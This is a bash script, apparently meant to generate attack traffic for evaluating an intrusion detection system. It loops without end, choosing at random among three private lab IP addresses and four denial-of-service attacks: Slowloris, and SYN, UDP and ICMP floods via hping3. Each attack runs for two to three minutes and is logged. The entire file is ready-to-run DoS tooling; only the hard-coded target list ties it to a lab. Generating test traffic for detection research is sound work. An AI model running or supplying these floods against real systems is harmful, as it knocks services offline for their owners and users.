#!/bin/bash

# List of target IPs for IDS evaluation
TARGET_IPS=("192.168.36.1" "192.168.36.2" "192.168.36.3")  # Add more IPs if needed

# Log file with timestamped name
LOG_FILE="dos_log_$(date '+%Y%m%d').txt"

# Function to log attacks
log_attack() {
    local attack_name=$1
    local target_ip=$2
    local duration=$3
    echo "$(date '+%Y-%m-%d %H:%M:%S') - Executed $attack_name on $target_ip for ${duration}s" >> "$LOG_FILE"
}

# Function to run Slowloris attack
run_slowloris() {
    local target_ip=$1
    TIMEOUT=$((RANDOM % 61 + 120))  
    timeout $TIMEOUT slowloris $target_ip &> /dev/null
    log_attack "Slowloris" "$target_ip" "$TIMEOUT"
}

# Function to run Hping3 (TCP SYN flood)
run_hping3() {
    local target_ip=$1
    TIMEOUT=$((RANDOM % 61 + 120))  
    timeout $TIMEOUT hping3 --flood -S $target_ip -p 80 &> /dev/null
    log_attack "Hping3 SYN Flood" "$target_ip" "$TIMEOUT"
}

# Function to run UDP flood attack
run_udpflood() {
    local target_ip=$1
    TIMEOUT=$((RANDOM % 61 + 120))  
    timeout $TIMEOUT hping3 --flood --udp $target_ip -p 53 &> /dev/null
    log_attack "UDP Flood" "$target_ip" "$TIMEOUT"
}

# Function to run ICMP Flood attack
run_icmp_flood() {
    local target_ip=$1
    TIMEOUT=$((RANDOM % 61 + 120))
    timeout $TIMEOUT hping3 --flood --icmp $target_ip &> /dev/null
    log_attack "ICMP Flood" "$target_ip" "$TIMEOUT"
}

# Main function to run attacks continuously
main() {
    echo "Logging DoS attacks to $LOG_FILE"

    # List of attack functions
    ATTACKS=("run_slowloris" "run_hping3" "run_udpflood" "run_icmp_flood")

    while true; do
        # Pick a random IP and random attack
        TARGET_IP=${TARGET_IPS[$RANDOM % ${#TARGET_IPS[@]}]}
        ATTACK=${ATTACKS[$RANDOM % ${#ATTACKS[@]}]}

        # Execute the selected attack on the chosen target
        echo "Attacking $TARGET_IP with $ATTACK"
        $ATTACK "$TARGET_IP"

        # Random delay between attacks (200-300s)
        RANDOM_DELAY=$((RANDOM % 101 + 200))
        sleep $RANDOM_DELAY
    done
}

# Start the main function
main
